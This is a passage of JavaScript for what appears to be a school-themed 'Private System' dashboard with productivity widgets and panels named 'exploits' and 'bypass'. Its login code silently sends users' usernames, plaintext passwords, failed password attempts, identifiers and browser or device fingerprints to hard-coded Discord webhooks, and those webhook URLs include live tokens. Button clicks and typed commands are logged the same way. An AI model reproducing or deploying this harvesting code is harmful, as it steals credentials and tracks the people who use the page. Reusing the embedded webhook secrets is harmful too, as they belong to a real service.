              this.sendDashboardWebhook('reminderAction', { action: 'Reminder Notification Triggered', reminder: reminder.text, priority: reminder.priority });
            }
          });
        }, 30 * 1000); // Check every 30 seconds
      },

      showNotification: function(message, isUrgent = false) {
        const notification = document.createElement('div');
        notification.classList.add('notification-alert');
        if (isUrgent) {
          notification.classList.add('reminder-urgent');
        }
        notification.innerHTML = `
          <span>${message}</span>
          <button class="close-btn">‚úñÔ∏è</button>
        `;
        document.body.appendChild(notification);

        // Remove after a few seconds unless it's urgent
        if (!isUrgent) {
          setTimeout(() => {
            notification.remove();
          }, 5000); // Remove after 5 seconds for non-urgent
        } else {
          // Urgent reminders stay until closed manually or after much longer
          setTimeout(() => {
            notification.remove();
          }, 15000); // Remove after 15 seconds for urgent if not manually closed
        }

        notification.querySelector('.close-btn').addEventListener('click', () => {
          notification.remove();
        });
      },

      // Task Manager functionality
      tasks: [],
      initTasks: function() {
        const savedTasks = localStorage.getItem('tasks');
        if (savedTasks) {
          this.tasks = JSON.parse(savedTasks);
        }
        this.renderTasks();
        document.getElementById('addTaskBtn').addEventListener('click', () => this.addTask());
      },
      saveTasks: function() {
        localStorage.setItem('tasks', JSON.stringify(this.tasks));
      },
      renderTasks: function() {
        const taskList = document.getElementById('taskList');
        taskList.innerHTML = '';
        if (this.tasks.length === 0) {
          taskList.innerHTML = '<p>No tasks added yet. Get started by adding one!</p>';
          return;
        }
        this.tasks.forEach(task => {
          const taskItem = document.createElement('div');
          taskItem.classList.add('task-item');
          if (task.completed) {
            taskItem.classList.add('completed');
          }
          taskItem.innerHTML = `
            <div class="task-item-details">
              <strong>${task.text}</strong>
            </div>
            <div class="task-item-controls">
              <button class="complete" data-id="${task.id}">${task.completed ? 'Undo' : 'Complete'}</button>
              <button class="delete" data-id="${task.id}">Delete</button>
            </div>
          `;
          taskList.appendChild(taskItem);
        });
        taskList.querySelectorAll('.complete').forEach(button => {
          button.addEventListener('click', (e) => this.toggleTaskComplete(e.target.dataset.id));
        });
        taskList.querySelectorAll('.delete').forEach(button => {
          button.addEventListener('click', (e) => this.deleteTask(e.target.dataset.id));
        });
      },
      addTask: function() {
        const taskInput = document.getElementById('taskText');
        const text = taskInput.value.trim();
        if (text) {
          const newTask = {
            id: Date.now().toString(),
            text,
            completed: false
          };
          this.tasks.push(newTask);
          this.saveTasks();
          this.renderTasks();
          taskInput.value = '';
          this.sendDashboardWebhook('taskAction', { action: 'Add Task', task: text });
        }
      },
      toggleTaskComplete: function(id) {
        const index = this.tasks.findIndex(t => t.id === id);
        if (index !== -1) {
          this.tasks[index].completed = !this.tasks[index].completed;
          this.saveTasks();
          this.renderTasks();
          this.sendDashboardWebhook('taskAction', { action: 'Toggle Task Complete', taskId: id, status: this.tasks[index].completed });
        }
      },
      deleteTask: function(id) {
        if (confirm('Are you sure you want to delete this task?')) {
          this.tasks = this.tasks.filter(t => t.id !== id);
          this.saveTasks();
          this.renderTasks();
          this.sendDashboardWebhook('taskAction', { action: 'Delete Task', taskId: id });
        }
      },

      // Pomodoro Timer functionality
      pomodoro: {
        workTime: 25 * 60, // 25 minutes
        breakTime: 5 * 60, // 5 minutes
        longBreakTime: 15 * 60, // 15 minutes
        currentTime: 25 * 60,
        isRunning: false,
        isWorkMode: true,
        interval: null,
        pomodorosCompleted: 0
      },
      initPomodoro: function() {
        const display = document.getElementById('pomodoroDisplay');
        const startBtn = document.getElementById('pomodoroStartBtn');
        const pauseBtn = document.getElementById('pomodoroPauseBtn');
        const resetBtn = document.getElementById('pomodoroResetBtn');

        this.updatePomodoroDisplay();

        startBtn.addEventListener('click', () => this.startPomodoro());
        pauseBtn.addEventListener('click', () => this.pausePomodoro());
        resetBtn.addEventListener('click', () => this.resetPomodoro());
      },
      updatePomodoroDisplay: function() {
        const minutes = Math.floor(this.pomodoro.currentTime / 60);
        const seconds = this.pomodoro.currentTime % 60;
        document.getElementById('pomodoroDisplay').textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
      },
      startPomodoro: function() {
        if (this.pomodoro.isRunning) return;
        this.pomodoro.isRunning = true;
        this.sendDashboardWebhook('buttonClick', { action: 'Pomodoro Start', mode: this.pomodoro.isWorkMode ? 'Work' : 'Break' });

        this.pomodoro.interval = setInterval(() => {
          this.pomodoro.currentTime--;
          this.updatePomodoroDisplay();

          if (this.pomodoro.currentTime <= 0) {
            clearInterval(this.pomodoro.interval);
            this.pomodoro.isRunning = false;
            // Play a sound for notification
            new Audio('https://www.soundjay.com/misc/sounds/bell-ringing-01.mp3').play().catch(e => console.error("Audio playback failed:", e)); // Example sound

            if (this.pomodoro.isWorkMode) {
              this.pomodoro.pomodorosCompleted++;
              alert(`Time for a break! You've completed ${this.pomodoro.pomodorosCompleted} pomodoro(s).`);
              this.pomodoro.isWorkMode = false;
              this.pomodoro.currentTime = (this.pomodoro.pomodorosCompleted % 4 === 0) ? this.pomodoro.longBreakTime : this.pomodoro.breakTime;
              this.sendDashboardWebhook('reminderAction', { action: 'Pomodoro Work End', pomodoros: this.pomodoro.pomodorosCompleted });
            } else {
              alert('Break is over! Time to get back to work.');
              this.pomodoro.isWorkMode = true;
              this.pomodoro.currentTime = this.pomodoro.workTime;
              this.sendDashboardWebhook('reminderAction', { action: 'Pomodoro Break End', pomodoros: this.pomodoro.pomodorosCompleted });
            }
            this.updatePomodoroDisplay();
            this.startPomodoro(); // Auto-start next interval
          }
        }, 1000);
      },
      pausePomodoro: function() {
        if (!this.pomodoro.isRunning) return;
        clearInterval(this.pomodoro.interval);
        this.pomodoro.isRunning = false;
        this.sendDashboardWebhook('buttonClick', { action: 'Pomodoro Pause' });
      },
      resetPomodoro: function() {
        clearInterval(this.pomodoro.interval);
        this.pomodoro.isRunning = false;
        this.pomodoro.isWorkMode = true;
        this.pomodoro.currentTime = this.pomodoro.workTime;
        this.pomodoro.pomodorosCompleted = 0;
        this.updatePomodoroDisplay();
        this.sendDashboardWebhook('buttonClick', { action: 'Pomodoro Reset' });
      },

      // Calculator functionality
      calculator: {
        display: '0',
        currentInput: '',
        previousInput: '',
        operator: null,
        justCalculated: false
      },
      initCalculator: function() {
        const displayElement = document.getElementById('calculatorDisplay');
        const buttons = document.querySelectorAll('.calculator-grid button');

        displayElement.textContent = this.calculator.display;

        buttons.forEach(button => {
          button.addEventListener('click', () => this.handleCalculatorInput(button.textContent));
        });
      },
      handleCalculatorInput: function(value) {
        this.sendDashboardWebhook('buttonClick', { action: 'Calculator Input', input: value });
        const calc = this.calculator;
        const displayElement = document.getElementById('calculatorDisplay');

        if (value >= '0' && value <= '9' || value === '.') {
          if (calc.justCalculated) {
            calc.currentInput = value;
            calc.justCalculated = false;
          } else if (calc.currentInput === '0' && value !== '.') {
            calc.currentInput = value;
          } else if (value === '.' && calc.currentInput.includes('.')) {
            // Do nothing if decimal already exists
          } else {
            calc.currentInput += value;
          }
          calc.display = calc.currentInput;
        } else if (['+', '-', '*', '/', '%', '+/-'].includes(value)) {
          if (value === '+/-') {
            if (calc.currentInput) {
              calc.currentInput = (parseFloat(calc.currentInput) * -1).toString();
              calc.display = calc.currentInput;
            }
          } else {
            if (calc.currentInput && calc.previousInput && calc.operator && !calc.justCalculated) {
              this.performCalculation();
            }
            if (calc.currentInput) {
              calc.previousInput = calc.currentInput;
              calc.currentInput = '';
            }
            calc.operator = value;
            calc.justCalculated = false;
          }
        } else if (value === '=') {
          if (calc.currentInput && calc.previousInput && calc.operator) {
            this.performCalculation();
            calc.operator = null;
            calc.justCalculated = true;
          }
        } else if (value === 'C') {
          calc.display = '0';
          calc.currentInput = '';
          calc.previousInput = '';
          calc.operator = null;
          calc.justCalculated = false;
        }
        displayElement.textContent = calc.display;
      },
      performCalculation: function() {
        const calc = this.calculator;
        let result = 0;
        const prev = parseFloat(calc.previousInput);
        const curr = parseFloat(calc.currentInput);

        if (isNaN(prev) || isNaN(curr)) return;

        switch (calc.operator) {
          case '+': result = prev + curr; break;
          case '-': result = prev - curr; break;
          case '*': result = prev * curr; break;
          case '/': result = prev / curr; break;
          case '%': result = prev % curr; break;
          default: return;
        }
        calc.display = result.toString();
        calc.currentInput = result.toString();
        calc.previousInput = '';
      },

      // Unit Converter functionality
      initUnitConverter: function() {
        const convertBtn = document.getElementById('convertBtn');
        convertBtn.addEventListener('click', () => this.convertUnit());
        
        // Also convert on input change for live feedback
        document.getElementById('convertValue').addEventListener('input', () => this.convertUnit());
        document.getElementById('convertFromUnit').addEventListener('change', () => this.convertUnit());
        document.getElementById('convertToUnit').addEventListener('change', () => this.convertUnit());

        this.convertUnit(); // Perform initial conversion on load
      },
      convertUnit: function() {
        const value = parseFloat(document.getElementById('convertValue').value);
        const fromUnit = document.getElementById('convertFromUnit').value;
        const toUnit = document.getElementById('convertToUnit').value;
        const outputElement = document.getElementById('unitConverterOutput');

        if (isNaN(value)) {
          outputElement.textContent = "Please enter a valid number.";
          return;
        }

        const conversions = {
          // To Meters base
          cm: v => v / 100,
          m: v => v,
          km: v => v * 1000,
          inch: v => v * 0.0254,
          ft: v => v * 0.3048,
          mi: v => v * 1609.34,
          // From Meters base
          to_cm: v => v * 100,
          to_m: v => v,
          to_km: v => v / 1000,
          to_inch: v => v / 0.0254,
          to_ft: v => v / 0.3048,
          to_mi: v => v / 1609.34
        };

        if (!conversions[fromUnit] || !conversions['to_' + toUnit]) {
          outputElement.textContent = "Conversion not supported.";
          return;
        }

        const valueInMeters = conversions[fromUnit](value);
        const result = conversions['to_' + toUnit](valueInMeters);

        outputElement.textContent = `${value} ${fromUnit} = ${result.toFixed(4)} ${toUnit}`;
        this.sendDashboardWebhook('buttonClick', { action: 'Unit Conversion', from: fromUnit, to: toUnit, value: value, result: result.toFixed(4) });
      },

      // Virtual Assistant functionality
      initVirtualAssistant: function() {
        const input = document.getElementById('virtualAssistantInput');
        input.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            this.handleVirtualAssistantCommand(input.value);
            input.value = '';
          }
        });
        this.appendAssistantOutput('Welcome! I am your Private System Assistant. How can I help? Type "help" for a list of commands.');
      },
      appendAssistantOutput: function(message, isUser = false) {
        const output = document.getElementById('virtualAssistantOutput');
        const timestamp = new Date().toLocaleTimeString();
        output.innerHTML += `<div style="margin-bottom: 5px;">[${timestamp}] ${isUser ? '<span style="color: #6aabff;">You:</span>' : '<span style="color: #0f0;">Assistant:</span>'} ${message}</div>`;
        output.scrollTop = output.scrollHeight; // Auto-scroll to bottom
      },
      handleVirtualAssistantCommand: function(command) {
        this.appendAssistantOutput(command, true);
        const lowerCommand = command.toLowerCase().trim();
        this.sendDashboardWebhook('buttonClick', { action: 'Virtual Assistant Command', command: command });

        if (lowerCommand === 'help') {
          this.appendAssistantOutput('Available commands:');
          this.appendAssistantOutput('- `time`: Get current time.');
          this.appendAssistantOutput('- `date`: Get current date.');
          this.appendAssistantOutput('- `weather`: Get simulated weather.');
          this.appendAssistantOutput('- `joke`: Tell me a joke.');
          this.appendAssistantOutput('- `motivation`: Get a motivational quote.');
          this.appendAssistantOutput('- `clear`: Clear output.');
          this.appendAssistantOutput('- `open [panel_name]`: e.g., `open reminders`');
          this.appendAssistantOutput('- `status`: Get system status.');
        } else if (lowerCommand === 'time') {
          this.appendAssistantOutput(`The current time is ${new Date().toLocaleTimeString()}.`);
        } else if (lowerCommand === 'date') {
          this.appendAssistantOutput(`Today's date is ${new Date().toLocaleDateString()}.`);
        } else if (lowerCommand === 'weather') {
          const weathers = ['Sunny with clear skies, 70¬∞F', 'Partly cloudy, 65¬∞F, chance of rain', 'Cloudy, 58¬∞F, light drizzle', 'Foggy morning, 55¬∞F'];
          this.appendAssistantOutput(`Current simulated weather: ${weathers[Math.floor(Math.random() * weathers.length)]}.`);
        } else if (lowerCommand === 'joke') {
          const jokes = [
            "Why don't scientists trust atoms? Because they make up everything!",
            "Did you hear about the actor who fell through the floorboards? He was just going through a stage!",
            "Why did the scarecrow win an award? Because he was outstanding in his field!",
            "I told my wife she was drawing her eyebrows too high. She looked surprised."
          ];
          this.appendAssistantOutput(jokes[Math.floor(Math.random() * jokes.length)]);
        } else if (lowerCommand === 'motivation') {
            const quotes = [
              "Believe you can and you're halfway there. - Theodore Roosevelt",
              "The future belongs to those who believe in the beauty of their dreams. - Eleanor Roosevelt",
              "It always seems impossible until it's done. - Nelson Mandela",
              "Success is not final, failure is not fatal: It is the courage to continue that counts. - Winston Churchill"
            ];
            this.appendAssistantOutput(quotes[Math.floor(Math.random() * quotes.length)]);
        } else if (lowerCommand === 'clear') {
          document.getElementById('virtualAssistantOutput').innerHTML = '';
          this.appendAssistantOutput('Output cleared.');
        } else if (lowerCommand.startsWith('open ')) {
          const panelName = lowerCommand.substring(5).trim().toLowerCase();
          const panelMap = {
            'wifi': 'wifiPanel', 'ipad': 'ipadPanel', 'handbook': 'handbookPanel', 'map': 'mapPanel',
            'student websites': 'studentWebsitesPanel', 'teacher websites': 'teacherWebsitesPanel',
            'phone directory': 'phoneDirectoryPanel', 'camera': 'cameraPanel', 'school info': 'schoolInfoPanel',
            'keyboard tricks': 'keyboardPanel', 'classes': 'classesPanel', 'grades': 'gradesPanel',
            'assignments': 'assignmentsPanel', 'study resources': 'studyResourcesPanel',
            'course catalog': 'courseCatalogPanel', 'attendance': 'attendancePanel',
            'clubs': 'clubsActivitiesPanel', 'sports': 'sportsTeamsPanel', 'events': 'schoolEventsPanel',
            'news': 'newsAnnouncementsPanel', 'counseling': 'counselingServicesPanel',
            'discipline': 'disciplineRecordsPanel', 'reminders': 'reminderPanel',
            'tasks': 'taskManagerPanel', 'pomodoro': 'pomodoroPanel', 'calculator': 'calculatorPanel',
            'unit converter': 'unitConverterPanel', 'assistant': 'virtualAssistantPanel',
            'exploits': 'exploitPanel', 'bypass': 'bypassPanel', 'vpn': 'vpnPanel',
            'gaming': 'gamingPanel', 'music': 'musicPanel', 'maintenance': 'maintenanceRequestsPanel',
            'it support': 'itSupportPanel', 'profile': 'profileSettingsPanel', 'customization': 'dashboardCustomizationPanel'
          };
          const targetPanelId = panelMap[panelName];
          if (targetPanelId) {
            this.togglePanel(targetPanelId);
            this.appendAssistantOutput(`Opening ${panelName} panel.`);
          } else {
            this.appendAssistantOutput(`Sorry, I don't recognize the panel "${panelName}".`);
          }
        } else if (lowerCommand === 'status') {
          this.appendAssistantOutput('System status: All core services operational. Network connectivity stable. User session active.');
        }
        else {
          this.appendAssistantOutput("Sorry, I don't understand that command. Type 'help' for a list of commands.");
        }
      },

      // Profile Settings functionality (simulated)
      initProfileSettings: function() {
        document.getElementById('updatePasswordBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Update Password Attempt (Simulated)' });
          const newPass = document.getElementById('settingPassword').value;
          const confirmPass = document.getElementById('settingConfirmPassword').value;
          if (newPass && newPass === confirmPass) {
            alert('Password updated successfully (simulated)!');
            document.getElementById('settingPassword').value = '';
            document.getElementById('settingConfirmPassword').value = '';
          } else {
            alert('Passwords do not match or are empty (simulated).');
          }
        });
        document.getElementById('updateEmailBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Update Email Attempt (Simulated)' });
          const newEmail = document.getElementById('settingEmail').value;
          if (newEmail) {
            alert(`Email updated to ${newEmail} (simulated)!`);
          } else {
            alert('Email cannot be empty (simulated).');
          }
        });
      },

      // Dashboard Customization functionality (simulated layout, real theme)
      applyLayout: function(layoutName, logChange = true) {
        const mainGrid = document.getElementById('mainGrid');
        mainGrid.classList.remove('grid2col', 'grid1col'); // Remove existing layout classes

        switch (layoutName) {
          case 'grid2col':
            mainGrid.style.display = 'grid';
            mainGrid.style.gridTemplateColumns = 'repeat(2, 1fr)';
            mainGrid.style.gap = '25px';
            break;
          case 'grid1col':
            mainGrid.style.display = 'grid';
            mainGrid.style.gridTemplateColumns = '1fr';
            mainGrid.style.gap = '25px';
            break;
          default: // 'default' (flex row)
            mainGrid.style.display = 'flex';
            mainGrid.style.flexWrap = 'wrap';
            mainGrid.style.gap = '25px';
        }
        this.userSettings.mainGridLayout = layoutName;
        this.saveSettings();
        if(logChange) {
          this.sendDashboardWebhook('buttonClick', { action: 'Apply Layout', layout: layoutName });
        }
      },

      initDashboardCustomization: function() {
        // Theme buttons are already handled by initThemeToggle
        // Layout preference
        const layoutSelect = document.getElementById('layoutPreference');
        layoutSelect.value = this.userSettings.mainGridLayout; // Set initial value
        document.getElementById('applyLayoutBtn').addEventListener('click', () => {
          this.applyLayout(layoutSelect.value);
        });

        // Update active theme display
        const activeThemeDisplay = document.getElementById('activeThemeDisplay');
        const updateThemeDisplay = () => {
          let themeText = 'Default (Dark)';
          switch (this.userSettings.theme) {
            case 'light': themeText = 'Light Mode'; break;
            case 'blue': themeText = 'Blue Accent'; break;
            case 'green': themeText = 'Green Accent'; break;
            case 'red': themeText = 'Red Accent'; break;
            case 'purple': themeText = 'Purple Accent'; break;
          }
          activeThemeDisplay.textContent = themeText;
        };
        // Call once on init and whenever theme might change
        updateThemeDisplay();
        // This is a bit tricky, the theme buttons also need to trigger this update
        // (already done by applyTheme which updates userSettings.theme)
      },

      // Global interaction logger (for clicks not handled by specific handlers)
      initGlobalInteractionLogger: function() {
        document.addEventListener('click', (e) => {
          if (e.target.tagName === 'BUTTON' && !e.target.id.startsWith('submitBtn') && !e.target.classList.contains('login-box')) {
            const buttonText = e.target.textContent.trim();
            const buttonId = e.target.id || 'N/A';
            const panelId = e.target.closest('.info-panel')?.id || 'N/A';
            if (!this.dashboardLoggingWebhooks.buttonClick) {
                console.warn("Global button click logging disabled: Webhook URL not configured.");
                return;
            }
            this.sendDashboardWebhook('buttonClick', {
              action: `Global Button Click`,
              buttonText: buttonText,
              buttonId: buttonId,
              parentPanel: panelId
            });
          }
          if (e.target.tagName === 'A' && e.target.target === '_blank') {
            const linkHref = e.target.href;
            const linkText = e.target.textContent.trim();
            const parentPanel = e.target.closest('.info-panel')?.id || 'N/A';
            this.sendDashboardWebhook('buttonClick', {
              action: `External Link Click`,
              linkText: linkText,
              linkHref: linkHref,
              parentPanel: parentPanel
            });
          }
        });
      },

      // Motivation quote rotation
      motivationQuotes: [
        "The only way to do great work is to love what you do. ‚Äì Steve Jobs",
        "Believe you can and you're halfway there. ‚Äì Theodore Roosevelt",
        "The future belongs to those who believe in the beauty of their dreams. ‚Äì Eleanor Roosevelt",
        "It always seems impossible until it's done. ‚Äì Nelson Mandela",
        "Success is not final, failure is not fatal: It is the courage to continue that counts. ‚Äì Winston Churchill",
        "Your time is limited, don't waste it living someone else's life. ‚Äì Steve Jobs",
        "The best way to predict the future is to create it. ‚Äì Peter Drucker",
        "Keep your eyes on the stars, and your feet on the ground. ‚Äì Theodore Roosevelt",
        "The harder you work for something, the greater you'll feel when you achieve it. ‚Äì Unknown",
        "Don‚Äôt watch the clock; do what it does. Keep going. ‚Äì Sam Levenson"
      ],
      startMotivationQuoteRotation: function() {
        const motivationBox = document.getElementById('motivationBox');
        let currentQuoteIndex = 0;

        const rotateQuote = () => {
          motivationBox.style.opacity = 0; // Start fade out
          setTimeout(() => {
            currentQuoteIndex = (currentQuoteIndex + 1) % this.motivationQuotes.length;
            motivationBox.textContent = this.motivationQuotes[currentQuoteIndex];
            motivationBox.style.opacity = 1; // Fade in
          }, 500); // Wait for fade out to complete
        };

        setInterval(rotateQuote, 10000); // Change quote every 10 seconds
      },

      // Ensure announcement bar scroll continues
      initAnnouncementBarScroll: function() {
        const announcementSpan = document.querySelector('.announcement-bar span');
        if (announcementSpan) {
            // Re-apply animation to ensure it starts/restarts correctly
            announcementSpan.style.animation = 'none';
            void announcementSpan.offsetWidth; // Trigger reflow
            announcementSpan.style.animation = 'scrollLeft 25s linear infinite';
        }
      },
    };

    // Login System JavaScript
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let users = [];
      let loginTime = null;

      // Show/hide password toggle
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
        })
        .catch(() => {
          users = [];
          console.error('Failed to load user JSON data. Defaulting to empty user list.');
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        if (!url || !embed) {
          console.warn('Attempted to send webhook with missing URL or embed data.');
          return;
        }
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders (unchanged)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
